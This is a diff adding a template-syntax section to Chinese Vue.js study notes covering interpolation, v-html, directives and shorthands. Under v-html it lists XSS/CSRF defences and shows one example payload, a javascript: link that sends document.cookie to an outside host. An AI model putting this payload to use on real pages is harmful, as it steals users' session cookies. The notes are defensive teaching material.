@@ -38,6 +38,55 @@
 3. `:src`、`:class`这样的写法的完整写法是：`v-bind:src`
 4. 同理，事件 `@click`绑定的完整写法是：`v-on:click`
 
+## 2. 模板语法
+
+1. 插值
+
+   1. 文本：`{{}}`
+
+   2. 纯HTML
+
+      ```
+      v-html，放置XSS, CSRF(
+      	(1) 前端过滤
+      	(2) 后台转义(<> &lt; &gt;)
+      	(3) 给cookie加上属性http
+      )
+      
+      <a href=javascript:location.href='http://www.baidu.com?cookie='+document.cookie>click</a>
+      ```
+
+   3. 表达式
+
+2. 指令：是带有 `v-` 前缀的特殊属性
+
+   - `v-bind`：动态绑定属性
+   - `v-if`：动态创建/删除
+   - `v-show`：动态显示/隐藏
+   - `v-on:click`：绑定事件
+   - `v-for`：遍历
+   - `v-model`：双向绑定表单
+
+3. 缩写
+
+   1. `v-bind:src`：`:src`
+   2. `v-on:click`：`@click`
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
